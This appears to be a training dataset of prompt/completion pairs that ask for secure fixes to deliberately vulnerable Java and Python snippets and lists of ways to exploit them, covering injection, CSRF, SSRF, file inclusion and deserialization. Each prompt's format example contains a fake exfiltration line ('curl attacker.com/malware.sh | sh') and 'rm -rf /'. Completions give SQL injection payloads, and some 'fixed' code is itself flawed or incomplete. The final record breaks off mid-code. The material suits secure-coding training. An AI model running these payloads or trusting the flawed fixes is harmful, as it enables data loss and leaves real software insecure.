{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Local File Inclusion (LFI) - Limited Scope\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class FileReadServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = \"/var/log/\" + request.getParameter(\"log\");\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (IOException e) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found.\");\n        }\n    }\n}\n- CVSS Score: 5.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import java.io.BufferedReader;\\\\nimport java.io.FileReader;\\\\nimport java.io.IOException;\\\\nimport javax.servlet.ServletException;\\\\nimport javax.servlet.http.HttpServlet;\\\\nimport javax.servlet.http.HttpServletRequest;\\\\nimport javax.servlet.http.HttpServletResponse;\\\\n\\\\npublic class FileReadServlet extends HttpServlet {\\\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\\\n        String filePath = \\\\\\\"/var/log/\\\\\\\" + request.getParameter(\\\\\\\"log\\\\\\\");\\\\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\\\\n            String line;\\\\n            while ((line = reader.readLine()) != null) {\\\\n                response.getWriter().println(line);\\\\n            }\\\\n        } catch (IOException e) {\\\\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \\\\\\\"File not found.\\\\\\\");\\\\n        }\\\\n    }\\\\n}\", \"vulnerability_type\": \"Local File Inclusion (LFI) - Limited Scope\", \"cvss_score\": 5.3, \"fixed_code\": \"import java.io.BufferedReader;\\\\nimport java.io.FileReader;\\\\nimport java.io.IOException;\\\\nimport javax.servlet.ServletException;\\\\nimport javax.servlet.http.HttpServlet;\\\\nimport javax.servlet.http.HttpServletRequest;\\\\nimport javax.servlet.http.HttpServletResponse;\\\\n\\\\npublic class FileReadServlet extends HttpServlet {\\\\n    private static final String LOG_DIR = \\\\\\\"/var/log/\\\\\\\";\\\\n    private static final String[] ALLOWED_FILES = {\\\\\\\"app.log\\\\\\\", \\\\\\\"system.log\\\\\\\", \\\\\\\"error.log\\\\\\\"};\\\\n\\\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\\\n        String fileName = request.getParameter(\\\\\\\"log\\\\\\\");\\\\n        if (fileName != null && isValidFile(fileName)) {\\\\n            String filePath = LOG_DIR + fileName;\\\\n            try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\\\\n                String line;\\\\n                while ((line = reader.readLine()) != null) {\\\\n                    response.getWriter().println(line);\\\\n                }\\\\n            } catch (IOException e) {\\\\n                response.sendError(HttpServletResponse.SC_NOT_FOUND, \\\\\\\"File not found.\\\\\\\");\\\\n            }\\\\n        } else {\\\\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \\\\\\\"Invalid file name.\\\\\\\");\\\\n        }\\\\n    }\\\\n\\\\n    private boolean isValidFile(String fileName) {\\\\n        for (String allowed : ALLOWED_FILES) {\\\\n            if (allowed.equals(fileName)) {\\\\n                return true;\\\\n            }\\\\n        }\\\\n        return false;\\\\n    }\\\\n}\", \"exploit_ways\": [\"An attacker could request \\\"/etc/passwd\\\" by manipulating the 'log' parameter to read sensitive system files.\", \"The vulnerability allows reading arbitrary log files, potentially leaking sensitive information stored in logs.\", \"Crafting a path traversal attack with '../' sequences might access files outside the intended /var/log directory if not properly mitigated.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Insecure Deserialization\n- Vulnerable Code: # Python example\nclass VulnerableClass:\n    def __reduce__(self):\n        return (eval, (\"__import__('os').system('touch /tmp/exploit')\",))\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"# Python example\\\\nclass VulnerableClass:\\\\n    def __reduce__(self):\\\\n        return (eval, (\\\\\\\"__import__('os').system('touch /tmp/exploit')\\\\\\\",))\", \"vulnerability_type\": \"Insecure Deserialization\", \"cvss_score\": 8.2, \"fixed_code\": \"# Python example\\\\nclass SafeClass:\\\\n    def __reduce__(self):\\\\n        # Secure method that does not execute arbitrary code\\\\n        return (str, ('SafeObject',))\", \"exploit_ways\": [\"An attacker could deserialize a malicious payload to execute arbitrary commands on the server.\", \"Could use this vulnerability to create, modify, or delete files on the system.\", \"Potential for executing remote code if the deserialized data can be controlled by an external actor.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Request Forgery (CSRF)\n- Vulnerable Code: import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class TransferServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        String amount = request.getParameter(\"amount\");\n        String destinationAccount = request.getParameter(\"destinationAccount\");\n        // Simulate transferring money without CSRF protection\n        transferMoney(amount, destinationAccount);\n    }\n\n    private void transferMoney(String amount, String destinationAccount) {\n        // Transfer logic here\n    }\n}\n- CVSS Score: 6.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import javax.servlet.http.HttpServlet;\\\\nimport javax.servlet.http.HttpServletRequest;\\\\nimport javax.servlet.http.HttpServletResponse;\\\\n\\\\npublic class TransferServlet extends HttpServlet {\\\\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\\\\n        String amount = request.getParameter(\\\\\\\"amount\\\\\\\");\\\\n        String destinationAccount = request.getParameter(\\\\\\\"destinationAccount\\\\\\\");\\\\n        // Simulate transferring money without CSRF protection\\\\n        transferMoney(amount, destinationAccount);\\\\n    }\\\\n\\\\n    private void transferMoney(String amount, String destinationAccount) {\\\\n        // Transfer logic here\\\\n    }\\\\n}\", \"vulnerability_type\": \"Cross-Site Request Forgery (CSRF)\", \"cvss_score\": 6.8, \"fixed_code\": \"import javax.servlet.http.HttpServlet;\\\\nimport javax.servlet.http.HttpServletRequest;\\\\nimport javax.servlet.http.HttpServletResponse;\\\\nimport java.util.UUID;\\\\n\\\\npublic class TransferServlet extends HttpServlet {\\\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\\\n        String csrfToken = UUID.randomUUID().toString();\\\\n        request.getSession().setAttribute(\\\\\\\"csrfToken\\\\\\\", csrfToken);\\\\n        // Render form with the CSRF token\\\\n    }\\\\n\\\\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\\\\n        String sessionCsrfToken = (String) request.getSession().getAttribute(\\\\\\\"csrfToken\\\\\\\");\\\\n        String requestCsrfToken = request.getParameter(\\\\\\\"csrfToken\\\\\\\");\\\\n\\\\n        if (!sessionCsrfToken.equals(requestCsrfToken)) {\\\\n            throw new SecurityException(\\\\\\\"CSRF Token Validation Failed\\\\\\\");\\\\n        }\\\\n\\\\n        String amount = request.getParameter(\\\\\\\"amount\\\\\\\");\\\\n        String destinationAccount = request.getParameter(\\\\\\\"destinationAccount\\\\\\\");\\\\n        transferMoney(amount, destinationAccount);\\\\n    }\\\\n\\\\n    private void transferMoney(String amount, String destinationAccount) {\\\\n        // Transfer logic here\\\\n    }\\\\n}\", \"exploit_ways\": [\"An attacker can craft a malicious form submission that tricks the victim into transferring funds without their knowledge.\", \"Using social engineering, an attacker can trick users to click on links or visit pages with embedded requests that perform unauthorized actions.\", \"By injecting crafted HTML content in vulnerable applications, attackers can automatically submit forged requests when users browse to the injected page.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: # Python example\ndef show_secrets():\n    secret_data = {\"username\": \"admin\", \"password\": \"12345\"}\n    print(secret_data)\n- CVSS Score: 2.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"# Python example\\\\ndef show_secrets():\\\\n    secret_data = {\\\\\\\"username\\\\\\\": \\\\\\\"admin\\\\\\\", \\\\\\\"password\\\\\\\": \\\\\\\"12345\\\\\\\"}\\\\n    print(secret_data)\", \"vulnerability_type\": \"Information Disclosure (Low Severity)\", \"cvss_score\": 2.0, \"fixed_code\": \"# Python example\\\\ndef show_secrets():\\\\n    # No longer prints sensitive information\\\\n    pass\", \"exploit_ways\": [\"An attacker can execute the function to retrieve username and password.\", \"This could be used for unauthorized access if the credentials are reused elsewhere.\", \"If logged, the output could leak sensitive data through system logs or console output.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: SQL Injection\n- Vulnerable Code: import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.SQLException;\nimport java.util.Scanner;\n\npublic class VulnerableApp {\n    private Connection connect() {\n        String url = \"jdbc:mysql://localhost:3306/mydatabase\";\n        String user = \"user\";\n        String password = \"password\";\n        try {\n            return DriverManager.getConnection(url, user, password);\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n            return null;\n        }\n    }\n\n    public void queryDatabase(String userInput) {\n        String sql = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        try (\n                Connection conn = connect();\n                java.sql.Statement stmt = conn.createStatement()) {\n            java.sql.ResultSet rs = stmt.executeQuery(sql);\n\n            while (rs.next()) {\n                System.out.println(rs.getString(\"username\") + \"\\t\" + rs.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        VulnerableApp app = new VulnerableApp();\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String userInput = scanner.nextLine();\n        app.queryDatabase(userInput);\n    }\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import java.sql.Connection;\\\\nimport java.sql.DriverManager;\\\\nimport java.sql.PreparedStatement;\\\\nimport java.sql.SQLException;\\\\nimport java.util.Scanner;\\\\n\\\\npublic class VulnerableApp {\\\\n    private Connection connect() {\\\\n        String url = \\\\\\\"jdbc:mysql://localhost:3306/mydatabase\\\\\\\";\\\\n        String user = \\\\\\\"user\\\\\\\";\\\\n        String password = \\\\\\\"password\\\\\\\";\\\\n        try {\\\\n            return DriverManager.getConnection(url, user, password);\\\\n        } catch (SQLException e) {\\\\n            System.out.println(e.getMessage());\\\\n            return null;\\\\n        }\\\\n    }\\\\n\\\\n    public void queryDatabase(String userInput) {\\\\n        String sql = \\\\\\\"SELECT * FROM users WHERE username = '\\\\\\\" + userInput + \\\\\\\"'\\\\\\\";\\\\n        try (\\\\n                Connection conn = connect();\\\\n                java.sql.Statement stmt = conn.createStatement()) {\\\\n            java.sql.ResultSet rs = stmt.executeQuery(sql);\\\\n\\\\n            while (rs.next()) {\\\\n                System.out.println(rs.getString(\\\\\\\"username\\\\\\\") + \\\\\\\"\\\\t\\\\\\\" + rs.getString(\\\\\\\"password\\\\\\\"));\\\\n            }\\\\n        } catch (SQLException e) {\\\\n            System.out.println(e.getMessage());\\\\n        }\\\\n    }\\\\n\\\\n    public static void main(String[] args) {\\\\n        VulnerableApp app = new VulnerableApp();\\\\n        Scanner scanner = new Scanner(System.in);\\\\n        System.out.print(\\\\\\\"Enter username: \\\\\\\");\\\\n        String userInput = scanner.nextLine();\\\\n        app.queryDatabase(userInput);\\\\n    }\\\\n}\", \"vulnerability_type\": \"SQL Injection\", \"cvss_score\": 7.5, \"fixed_code\": \"import java.sql.Connection;\\\\nimport java.sql.DriverManager;\\\\nimport java.sql.PreparedStatement;\\\\nimport java.sql.ResultSet;\\\\nimport java.sql.SQLException;\\\\nimport java.util.Scanner;\\\\n\\\\npublic class SecureApp {\\\\n    private Connection connect() {\\\\n        String url = \\\\\\\"jdbc:mysql://localhost:3306/mydatabase\\\\\\\";\\\\n        String user = \\\\\\\"user\\\\\\\";\\\\n        String password = \\\\\\\"password\\\\\\\";\\\\n        try {\\\\n            return DriverManager.getConnection(url, user, password);\\\\n        } catch (SQLException e) {\\\\n            System.out.println(e.getMessage());\\\\n            return null;\\\\n        }\\\\n    }\\\\n\\\\n    public void queryDatabase(String userInput) {\\\\n        String sql = \\\\\\\"SELECT * FROM users WHERE username = ?\\\\\\\";\\\\n        try (\\\\n                Connection conn = connect();\\\\n                PreparedStatement pstmt = conn.prepareStatement(sql)) {\\\\n            pstmt.setString(1, userInput);\\\\n            ResultSet rs = pstmt.executeQuery();\\\\n\\\\n            while (rs.next()) {\\\\n                System.out.println(rs.getString(\\\\\\\"username\\\\\\\") + \\\\\\\"\\\\t\\\\\\\" + rs.getString(\\\\\\\"password\\\\\\\"));\\\\n            }\\\\n        } catch (SQLException e) {\\\\n            System.out.println(e.getMessage());\\\\n        }\\\\n    }\\\\n\\\\n    public static void main(String[] args) {\\\\n        SecureApp app = new SecureApp();\\\\n        Scanner scanner = new Scanner(System.in);\\\\n        System.out.print(\\\\\\\"Enter username: \\\\\\\");\\\\n        String userInput = scanner.nextLine();\\\\n        app.queryDatabase(userInput);\\\\n    }\\\\n}\", \"exploit_ways\": [\"User could input \\\"admin' OR '1'='1\\\" to retrieve all users.\", \"Could use \\\"admin'; DROP TABLE users; --\\\" to delete the users table.\", \"Input like \\\"admin'; SELECT * FROM passwords; --\\\" can extract data from another table.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Buffer Overflow\n- Vulnerable Code: public void vulnerableFunction(String input) {\n    byte[] buffer = new byte[10];\n    System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"public void vulnerableFunction(String input) {\\\\n    byte[] buffer = new byte[10];\\\\n    System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\\\\n}\", \"vulnerability_type\": \"Buffer Overflow\", \"cvss_score\": 7.5, \"fixed_code\": \"public void safeFunction(String input) {\\\\n    byte[] buffer = new byte[10];\\\\n    byte[] inputData = input.getBytes();\\\\n    int lengthToCopy = Math.min(inputData.length, buffer.length);\\\\n    System.arraycopy(inputData, 0, buffer, 0, lengthToCopy);\\\\n}\", \"exploit_ways\": [\"An attacker can provide a string longer than 10 bytes to overwrite adjacent memory.\", \"This overflow could be used to manipulate program execution or corrupt data structures.\", \"In some environments, this vulnerability might allow an attacker to execute arbitrary code.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Server-Side Request Forgery (SSRF) - Limited Scope\n- Vulnerable Code: import requests\nclass Fetcher:\n    def __init__(self, url):\n        self.url = url\n    def get_content(self):\n        response = requests.get(self.url)\n        return response.text\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import requests\\\\nclass Fetcher:\\\\n    def __init__(self, url):\\\\n        self.url = url\\\\n    def get_content(self):\\\\n        response = requests.get(self.url)\\\\n        return response.text\", \"vulnerability_type\": \"Server-Side Request Forgery (SSRF) - Limited Scope\", \"cvss_score\": 6.5, \"fixed_code\": \"import requests\\\\nfrom urllib.parse import urlparse\\\\nclass Fetcher:\\\\n    def __init__(self, url):\\\\n        self.url = url\\\\n        parsed_url = urlparse(url)\\\\n        if not (parsed_url.scheme in ['http', 'https'] and parsed_url.netloc in ['allowed.example.com']):\\\\n            raise ValueError('Invalid URL')\\\\n    def get_content(self):\\\\n        response = requests.get(self.url)\\\\n        return response.text\", \"exploit_ways\": [\"An attacker could specify an internal IP address to access internal services not exposed externally.\", \"They might use file:// URLs to read local files on the server if the application does not properly sanitize inputs.\", \"Crafting a URL with a slow host (slowloris) could be used for denial-of-service attacks.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: SQL Injection\n- Vulnerable Code: import sqlite3\ndef get_user(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username='\" + username + \"'\"\n    cursor.execute(query)\n    user = cursor.fetchone()\n    conn.close()\n    return user\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import sqlite3\\\\ndef get_user(username):\\\\n    conn = sqlite3.connect('example.db')\\\\n    cursor = conn.cursor()\\\\n    query = \\\\\\\"SELECT * FROM users WHERE username='\\\\\\\" + username + \\\\\\\"'\\\\\\\"\\\\n    cursor.execute(query)\\\\n    user = cursor.fetchone()\\\\n    conn.close()\\\\n    return user\", \"vulnerability_type\": \"SQL Injection\", \"cvss_score\": 7.5, \"fixed_code\": \"import sqlite3\\\\ndef get_user(username):\\\\n    conn = sqlite3.connect('example.db')\\\\n    cursor = conn.cursor()\\\\n    query = \\\\\\\"SELECT * FROM users WHERE username=?\\\\\\\"\\\\n    cursor.execute(query, (username,))\\\\n    user = cursor.fetchone()\\\\n    conn.close()\\\\n    return user\", \"exploit_ways\": [\"An attacker can input 'admin' OR '1'='1' to bypass authentication.\", \"They can use 'UNION SELECT' to extract data from other tables.\", \"Input like '; DROP TABLE users' can delete critical data.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: # Python example\nclass UserAuth:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n    \n    def login(self, username, password):\n        return username == \"admin\" and password == \"password123\"\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"# Python example\\\\nclass UserAuth:\\\\n    def __init__(self, username, password):\\\\n        self.username = username\\\\n        self.password = password\\\\n    \\\\n    def login(self, username, password):\\\\n        return username == \\\\\\\"admin\\\\\\\" and password == \\\\\\\"password123\\\\\\\"\", \"vulnerability_type\": \"Broken Authentication\", \"cvss_score\": 6.5, \"fixed_code\": \"# Python example\\\\nclass UserAuth:\\\\n    def __init__(self, username, password):\\\\n        self.username = username\\\\n        self.password = self.hash_password(password)\\\\n    \\\\n    def hash_password(self, password):\\\\n        import hashlib\\\\n        return 